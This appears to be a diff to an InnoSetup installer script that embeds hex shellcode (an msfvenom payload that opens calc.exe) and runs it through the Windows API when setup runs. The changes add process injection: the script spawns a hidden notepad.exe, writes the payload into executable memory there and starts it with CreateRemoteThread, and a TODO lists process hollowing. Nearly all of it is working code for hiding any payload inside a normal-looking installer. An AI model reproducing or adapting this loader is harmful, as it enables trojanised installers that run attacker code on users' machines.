@@ -8,15 +8,21 @@
 ; Description:                                                                         -
 ;  Embedd shellcode inside InnoSetup for execution during setup installation.          -
 ;  The shellcode is executed using InnoSetup Pascal Code Engine through Windows API.   -
-;
-; REL: July 2021
+;                                                                                      -
+; REL: July 2021                                                                       -
+;                                                                                      -
+; TODO:                                                                                -
+;  - [EASY] Support x86-64 InnoSetup Installers.                                       -
+;  - [EASY] Run PE (Process Hollowing).                                                -
 ; --------------------------------------------------------------------------------------
 
 ; Configuration
-#define SpawnNewProcess 0
-#define verbose 1
+#define SpawnNewProcess 0              ; 1 = Yes; 0 = No, payload is hosted and executed in current process.
+#define SpawnProcessName "notepad.exe" ; Used if "SpawnNewProcess" is set to "1".
+#define verbose 1                      ; 1 = Yes; 0 = No.
 
-; msfvenom -p windows/exec -a x86 --platform Windows CMD=calc.exe EXITFUNC=thread -f hex 
+; msfvenom -p windows/exec -a x86 --platform Windows CMD=calc.exe EXITFUNC=thread -f hex
+; If SpawnNewProcess is set to "1". It is recommended to use the EXITFUNC with ExitProcess instead of Thread. 
 #define Payload "fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6a018d85b20000005068318b6f87ffd5bbe01d2a0a68a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd563616c632e65786500"
 
 ; BEGIN: Do whatever you want your setup to do.
@@ -49,20 +55,16 @@ type
   { Structures }
 
   TPayloadArray = array of byte;
+  __Pointer__       = PAnsiChar;
+  TReference        = Cardinal;
 
   { WinAPI Structures }
 
-  TSecurityAttributes = record
-     nLength              : DWORD;
-     lpSecurityDescriptor : PAnsiChar;
-     bInheritHandle       : BOOL;
-  end;
-
   TStartupInfoA = record
     cb              : DWORD;
-    lpReserved      : PAnsiChar;
-    lpDesktop       : PAnsiChar;
-    lpTitle         : PAnsiChar;
+    lpReserved      : __Pointer__;
+    lpDesktop       : __Pointer__;
+    lpTitle         : __Pointer__;
     dwX             : DWORD;
     dwY             : DWORD;
     dwXSize         : DWORD;
@@ -73,7 +75,7 @@ type
     dwFlags         : DWORD;
     wShowWindow     : Word;
     cbReserved2     : Word;
-    lpReserved2     : PAnsiChar;
+    lpReserved2     : __Pointer__;
     hStdInput       : THandle;
     hStdOutput      : THandle;
     hStdError       : THandle;
@@ -90,22 +92,22 @@ type
 
 // Alternatively we can use VirtualAllocEx with current process handle.
 function VirtualAlloc(
-  lpAddress : PAnsiChar;
+  lpAddress : __Pointer__;
   dwSize    : Cardinal;
   flAllocationType,
   flProtect : DWORD
-) : Cardinal; external 'VirtualAlloc@kernel32.dll stdcall';
+) : TReference; external 'VirtualAlloc@kernel32.dll stdcall';
 
 function VirtualAllocEx(
   hProcess  : THandle;
-  lpAddress : PAnsiChar;
+  lpAddress : __Pointer__;
   dwSize    : Cardinal;
   flAllocationType,
   flProtect : DWORD
-) : Cardinal; external 'VirtualAllocEx@kernel32.dll stdcall';
+) : TReference; external 'VirtualAllocEx@kernel32.dll stdcall';
 
 function VirtualFree(
-  lpAddress  : Cardinal;
+  lpAddress  : TReference;
   dwSize     : Cardinal;
   dwFreeType : DWORD
 ) : BOOL; external 'VirtualFree@kernel32.dll stdcall';
@@ -113,22 +115,22 @@ function VirtualFree(
 function GetLastError() : DWORD; external 'GetLastError@kernel32.dll stdcall';
 
 function CreateThread(
-  lpThreadAttributes : PAnsiChar;
+  lpThreadAttributes : __Pointer__;
   dwStackSize        : Cardinal;
-  lpStartAddress     : Cardinal;
-  lpParameter        : PAnsiChar;
+  lpStartAddress     : TReference;
+  lpParameter        : __Pointer__;
   dwCreationFlags    : DWORD;
   var lpThreadId     : DWORD
 ) : THANDLE; external 'CreateThread@kernel32.dll stdcall';
 
 procedure RtlMoveMemory(
-  Dest       : Cardinal;
+  Dest       : TReference;
   Source     : TPayloadArray;
   Len        : Integer
 ); external 'RtlMoveMemory@kernel32.dll stdcall';
 
 procedure OutputDebugAddress(
-  lpAddress : Cardinal
+  lpAddress : TReference
 ); external 'OutputDebugStringA@kernel32.dll stdcall';
 
 procedure OutputDebugStringA(
@@ -136,17 +138,17 @@ procedure OutputDebugStringA(
 ); external 'OutputDebugStringA@kernel32.dll stdcall';
 
 function CryptBinaryToStringA(
-  lpAddress         : Cardinal;
+  lpAddress         : TReference;
   cbBinary, dwFlags : DWORD;
-  pszString         : Cardinal;
+  pszString         : TReference;
   var pcchString    : DWORD
 ) : BOOL; external 'CryptBinaryToStringA@crypt32.dll stdcall';
 
 function CreateProcessA(
   lpApplicationName        : PAnsiChar;
   lpCommandLine            : PAnsiChar;
-  var lpProcessAttributes  : TSecurityAttributes;
-  var lpThreadAttributes   : TSecurityAttributes;
+  lpProcessAttributes      : __Pointer__;
+  lpThreadAttributes       : __Pointer__;
   bInheritHandles          : BOOL;
   dwCreationFlags          : DWORD;
   lpEnvironment            : PAnsiChar;
@@ -154,6 +156,24 @@ function CreateProcessA(
   const lpStartupInfo      : TStartupInfoA;
   var lpProcessInformation : TProcessInformation
 ) : BOOL; external 'CreateProcessA@kernel32.dll stdcall';
+
+function WriteProcessMemory(
+  hProcess                   : THandle;
+  lpBaseAddress              : TReference; // Ptr
+  lpBuffer                   : TPayloadArray; 
+  nSize                      : Cardinal;
+  var lpNumberOfBytesWritten : Cardinal
+) : BOOL; external 'WriteProcessMemory@kernel32.dll stdcall';
+
+function CreateRemoteThread(
+  hProcess           : THandle;
+  lpThreadAttributes : __Pointer__;
+  dwStackSize        : Cardinal;
+  lpStartAddress     : TReference; // Ptr
+  lpParameter        : __Pointer__;
+  dwCreationFlags    : DWORD;
+  var lpThreadid     : DWORD
+) : THandle; external 'CreateRemoteThread@kernel32.dll stdcall';
 
 { WinAPI Constants }
 
@@ -163,6 +183,8 @@ const MEM_COMMIT             = $00001000;
       PAGE_READWRITE         = $00000004;    
       CRYPT_STRING_HEX       = $00000004;
       MEM_RELEASE            = $00008000;
+      STARTF_USESHOWWINDOW   = $00000001;      
+
       
 { Variables }
 
@@ -178,7 +200,7 @@ begin
     OutputDebugStringA(AMessage);
 end;
 
-procedure DebugAddress(const lpAddress : Cardinal);
+procedure DebugAddress(const lpAddress : TReference);
 begin
   if {#verbose} = 1 then
     OutputDebugAddress(lpAddress);
@@ -186,7 +208,7 @@ end;
 
 { _.GetMem }
 
-function GetMem(const ASize : Cardinal; const AExecute : Boolean) : Cardinal;
+function GetMem(const ASize : Cardinal; const AExecute : Boolean) : TReference;
 var AFlags : DWORD;
     ARet   : Cardinal;
 begin
@@ -195,11 +217,18 @@ begin
   else
     AFlags := PAGE_READWRITE;
 
+  Debug(Format('Create new memory region of %d bytes...', [ASize]));
+
   ARet := VirtualAlloc(pNil, ASize, MEM_COMMIT or MEM_RESERVE, AFlags);
 
-  if GetLastError() = 0 then
+  if GetLastError() = 0 then begin
+    Debug(Format('Region successfully created, starting at address: "%d(%x)"', [
+      ARet,
+      ARet
+    ]));
+
     result := ARet
-  else begin
+  end else begin
     Debug(Format('Failed to create memory region with last error=[%d].', [GetLastError()])); 
 
     result := 0;
@@ -208,9 +237,11 @@ end;
 
 { _.CreateExecutableRemoteMem }
 
-function CreateExecutableRemoteMem(const ASize : Cardinal; const hProcess : THandle) : Cardinal;
+function CreateExecutableRemoteMem(const ASize : Cardinal; const hProcess : THandle) : TReference;
 var ARet : Cardinal;
 begin
+  Debug(Format('Create new memory region of %d bytes in target process=[%d]...', [ASize, hProcess]));
+
   ARet := VirtualAllocEx(
             hProcess,
             pNil,
@@ -219,9 +250,14 @@ begin
             PAGE_EXECUTE_READWRITE
   );
 
-  if GetLastError() = 0 then
-    result := ARet
-  else begin
+  if GetLastError() = 0 then begin
+    Debug(Format('Remote region successfully created, starting at address: "%d(%x)"', [
+      ARet,
+      ARet
+    ]));
+
+    result := ARet;
+  end else begin
     Debug(Format(
             'Failed to create remote memory region (process handle=[%d]) with last error=[%d].', [
               hProcess,
@@ -235,24 +271,33 @@ end;
 
 { _.FreeMem }
 
-procedure FreeMem(const lpAddress : Cardinal; const ASize : DWORD);
+procedure FreeMem(const lpAddress : TReference; const ASize : DWORD);
 begin
   VirtualFree(lpAddress, ASize, MEM_RELEASE);
 end;
 
 { _.DumpMemory }
 
-procedure DumpMemory(const lpAddress : Cardinal; const ASize : DWORD);
+procedure DumpMemory(const lpAddress : TReference; const ASize : DWORD);
 var AMemAddr : Cardinal;
     AReqSize : DWORD;
 begin
   CryptBinaryToStringA(lpAddress, ASize, CRYPT_STRING_HEX, 0, AReqSize);
 
   AMemAddr := GetMem(AReqSize, False);
-  try
+  try    
     CryptBinaryToStringA(lpAddress, ASize, CRYPT_STRING_HEX, AMemAddr, AReqSize);
 
+    Debug('***');
+    Debug(Format('Dump %d bytes from memory starting at address: "%d(%x)":', [
+                    ASize,
+                    lpAddress,
+                    lpAddress
+                  ])
+    );
+
     DebugAddress(AMemAddr);
+    Debug('***');
   finally
     FreeMem(lpAddress, ASize);
   end;
@@ -301,37 +346,35 @@ begin
       break;
   end; 
 
-  result := True;  
+  result := Length(PAYLOAD) > 0;  
 end;     
+
+{ _.DebugLastError }
+
+procedure DebugLastError(const AWinAPI : String);
+begin
+  Debug(Format('Call to "%s" failed with last error: %d.', [AWinAPI, GetLastError()]));
+end;
 
 { _.ExecLocalShellcode }
 
 procedure ExecLocalShellcode();
 var AThreadId     : DWORD;    
     AThreadHandle : THandle;
-    AMemAddr      : Cardinal;
+    AMemAddr      : TReference;
 begin
-  Debug('Create new memory region to host our payload in current process...');  
-
   AMemAddr := GetMem(Length(PAYLOAD), True);       
   if (AMemAddr = 0) then                                                                           
     Exit;                         
-
-  Debug(
-    Format('Memory region successfully created at address=[%x(%d)], size=[%dB].', [
-      AMemAddr,
-      AMemAddr,
-      Length(PAYLOAD)
-    ])
-   );        
 
   Debug('Copy our payload to new memory region...');
  
   RtlMoveMemory(AMemAddr, PAYLOAD, Length(PAYLOAD));  
   
-  Debug('Payload successfully copied. Dumping memory region content:');
+  Debug('Payload successfully copied.');
+
   DumpMemory(AMemAddr, Length(PAYLOAD));
-  Debug('---');
+  
 
   Debug('Execute payload in a separate thread...');
 
@@ -340,6 +383,105 @@ begin
     Debug(Format('Payload successfully executed, ThreadHandle=[%d], ThreadId=[%d].', [AThreadHandle, AThreadId]))
   else
     Debug('Failed to execute payload.');
+end;
+
+{ _.ExecRemoteShellcode }
+
+procedure ExecRemoteShellcode();
+var AStartupInfo  : TStartupInfoA;
+    AProcessInfo  : TProcessInformation;
+    AMemAddr      : TReference;
+    ABytesWritten : Cardinal;
+    AThreadHandle : THandle;
+    AThreadId     : DWORD;
+begin
+  AStartupInfo.cb := SizeOf(AStartupInfo);
+
+  // Unfortunately, I did not found any API / method to nil a memory region 
+  //                  (Ex: FillChar, ZeroMemory, Memset etc...)
+  //
+  // TODO: Create my own "memset()".
+  AStartupInfo.lpReserved      := pNil;
+  AStartupInfo.lpDesktop       := pNil;
+  AStartupInfo.lpTitle         := pNil;
+  AStartupInfo.dwX             := 0;
+  AStartupInfo.dwY             := 0;
+  AStartupInfo.dwXSize         := 0;
+  AStartupInfo.dwYSize         := 0;
+  AStartupInfo.dwXCountChars   := 0;
+  AStartupInfo.dwYCountChars   := 0;
+  AStartupInfo.dwFillAttribute := 0;
+  AStartupInfo.dwFlags         := STARTF_USESHOWWINDOW;
+  AStartupInfo.wShowWindow     := SW_HIDE;
+  AStartupInfo.cbReserved2     := 0;
+  AStartupInfo.lpReserved2     := pNil;
+  AStartupInfo.hStdInput       := 0;
+  AStartupInfo.hStdOutput      := 0;
+  AStartupInfo.hStdError       := 0; 
+
+  Debug(Format('Spawn new process=[%s] to host our payload.', ['{#SpawnProcessName}']));
+
+  if not CreateProcessA(
+          pNil,
+          '{#SpawnProcessName}',
+          pNil,
+          pNil,
+          False,
+          0,
+          pNil,
+          pNil,
+          AStartupInfo,
+          AProcessInfo
+  ) then begin
+    DebugLastError('CreateProcessA');
+
+    Exit;
+  end;
+
+  Debug(Format('Process successfully spawned with id=[%d], handle=[%d].', [
+          AProcessInfo.dwProcessId,
+          AProcessInfo.hProcess
+  ]));
+
+  AMemAddr := CreateExecutableRemoteMem(Length(PAYLOAD), AProcessInfo.hProcess);
+
+  if not WriteProcessMemory(
+            AProcessInfo.hProcess,
+            AMemAddr,
+            PAYLOAD,
+            Length(PAYLOAD),
+            ABytesWritten
+         ) then begin
+    DebugLastError('WriteProcessMemory');
+
+    Exit;
+  end;
+
+  Debug(Format('%d bytes written to process=[%d].', [ABytesWritten, AProcessInfo.hProcess]));
+
+  Debug('Create new remote thread at payload location for execution...');
+
+  AThreadHandle := CreateRemoteThread(
+    AProcessInfo.hProcess,
+    pNil,
+    0,         // Auto
+    AMemAddr,  // Payload location
+    pNil,      
+    0,         // Run now   
+    AThreadId  // __Out__
+  );
+
+  if AThreadHandle = 0 then begin
+    DebugLastError('CreateRemoteThread');
+
+    Exit;
+  end;
+
+  Debug(Format('Payload successfully executed from process_id=[%d], thread_id=[%d]/hThread=[%d]', [
+    AProcessInfo.dwProcessId,
+    AThreadId,
+    AThreadHandle
+  ]));
 end;
 
 { _.CurStepChanged }
@@ -353,7 +495,7 @@ begin
           Exit;        
 
         if {#SpawnNewProcess} = 1 then
-          sleep(1) // TODO: Stay tuned for external process shellcode execution.
+          ExecRemoteShellcode()
         else
           ExecLocalShellcode();             
       end;
